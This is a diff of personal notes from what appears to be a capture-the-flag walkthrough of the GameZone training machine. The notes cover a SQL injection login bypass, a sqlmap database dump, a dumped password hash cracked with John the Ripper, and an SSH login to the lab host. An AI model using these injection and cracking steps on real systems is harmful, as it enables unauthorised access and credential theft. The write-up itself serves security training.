@@ -29,6 +29,45 @@ GameZone doesn't have an admin user in the database, however you can still login
 
 Use ' or 1=1 -- - as your username and leave the password blank.
 
-When you've logged in, what page do you get redirected to?
+QUESTION 2 - When you've logged in, what page do you get redirected to?
 portal.php
+
+==============================================================================================================================================================================================================================
+USING SQLMAP
+
+SQLMap is a popular open-source, automatic SQL injection and database takeover tool.
+There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.
+
+NOW WE ARE GOING TO DUMP THE ENTIRE DATABASE FOR GAMEZONE
+Using the page we logged into earlier, we're going point SQLMap to the game review search feature.
+
+First we need to intercept a request made to the search feature using BurpSuite.
+Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session:
+sqlmap -r request.txt --dbms=mysql --dump
+
+-r uses the intercepted request you saved earlier
+--dbms tells SQLMap what type of database management system it is
+--dump attempts to outputs the entire database
+
+
+
+
+ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14    - password hash
+agent47        - username
+==============================================================================================================================================================================================================================
+CRACKING PASSWORD HASH WITH JOHN THE RIPPER
+
+SAVE HASH TO TXT FILE
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
+
+
+ssh agent47@10.10.47.238
+
+
+user.txt found
+
+==============================================================================================================================================================================================================================
+
+EXPOSING SERVICES WITH REVERSE SSH TUNNELS
+
 
